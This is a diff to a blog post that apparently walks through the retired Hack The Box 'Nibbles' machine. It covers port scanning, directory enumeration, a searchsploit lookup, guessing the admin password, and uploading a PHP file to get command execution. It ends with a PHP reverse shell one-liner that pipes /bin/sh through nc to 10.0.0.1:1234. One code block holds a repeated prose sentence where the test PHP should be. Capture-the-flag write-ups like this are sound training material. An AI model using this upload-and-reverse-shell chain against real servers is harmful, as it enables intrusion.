@@ -7,7 +7,13 @@ img_path: /assets/img/posts
 ---
 
 ![nibbles](htb-nibles-desc.png)
-_nibbles_
+*nibbles*
+
+> In this article we are going to assume the following IP addresses:
+>
+>Local machine (attacker): 10.0.0.1
+>Target machine (victim): 10.0.0.2
+{: .prompt-info}
 
 As this is a retired machine, this will be a grey-box approach, because we have some information about the target.
 
@@ -24,7 +30,7 @@ From this information we can assume that the target machine will be a GNU/Linux 
 We are going to scan the target machine to see if our suspicions are confirmed.
 
 ```
-nmap -P0 -n -sV --open -oA nibbles_inital_scan 10.0.0.2
+$ nmap -P0 -n -sV --open -oA nibbles_inital_scan 10.0.0.2
 ```
 
 ```
@@ -51,7 +57,7 @@ A hidden directory...
 If we browse to the /nibbleblog directory we will guess that it is a nibble blog. Apart from this, nothing interesting:
 
 ![/nibbles directory](htb-nibbles-nibbles-directory.png)
-_/nibles_directory_
+*/nibles_directory*
 
 ## Technologies in use
 
@@ -69,7 +75,7 @@ As `/nibbleblog` is hidden, let's see if there are more directories hidden.
 For this we are going to use `gobuster`:
 
 ```
-gobuster dir -u http://10.0.0.2/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
+$ gobuster dir -u http://10.0.0.2/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
 ```
 
 ```
@@ -102,10 +108,35 @@ XXXX/XX/XX XX:XX:XX Starting gobuster in directory enumeration mode
 ===============================================================
 ```
 
+### README
+
+If we check the `README`file we can see the nibbles blog version in use
+
+```====== Nibbleblog ======
+Version: v4.0.3
+Codename: Coffee
+Release date: 2014-04-01
+```
+
+If we look for exploits for nibbleblog we can see that there is one arbitrary file inclusion for the version in use:
+
+```
+$ searchsploit nibbleblog          
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nibbleblog 3 - Multiple SQL Injections                                                                                                                                     | php/webapps/35865.txt
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                      | php/remote/38489.rb
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+### admin.php
+
 We can see that there is an `admin.php` page...
 
-![admin.php](htb-nibbles-nibbles-admin.png)
-_admin.php_
+![admin.php](htb-nibbles-nibbles-adminphp.png)
+*admin.php*
 
 Unfortunately we don't have valid credentials, and the blog has bruteforcing protection.
 
@@ -129,6 +160,8 @@ Here, we can found our valid admin user name:
 
 Now, we have a valid admin user name, but we don't have a password...
 
+### config.xml
+
 In the `/nibbleblog/content/private/` directory we can found another interesting file: `config.xml`.
 If we check the `config.xml` file, we will not find any password, but we found three mentions of `nibbles`, one in the notification mail address...
 
@@ -143,6 +176,37 @@ If we check the `config.xml` file, we will not find any password, but we found t
 At this point, with the brute force option ruled out, we should have to take a leap of faith.
 We will try `nibbles` as the admin account password.
 
+It worked!
+
+![Nibbleblog admin dashboard](htb-nibbles-nibbles-admin-dashboard.png)
+*Nibbleblog admin dashboard*
+
+It seems that we can upload files from the section `Plugins`.
+So, we can upload a PHP snippet code to verify that we can upload files and if they can be used for code execution.
+
+We create a file `ce_test.php` with the following content:
+
+```php
+So, we can upload a PHP snipet code to check the file upload and if can be use to code execution.
+```
+
+Leaving aside a bunch of errors, it seems that the file has been uploaded.
+
+The file was uploaded in the `/nibbleblog/content/private/plugins/my_image/`, but renamed to `image.php`.
+Let's check if we have command execution:
+
+```
+$ curl http://10.0.0.2/nibbleblog/content/private/plugins/my_image/image.php
+
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+We have code execution, so we need to obtain a reverse shell. 
+In order to do this, we create a file `rs.php` with the following bash one-liner reverse shell:
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"); ?>
+```
 
 # Privilege escalation
 
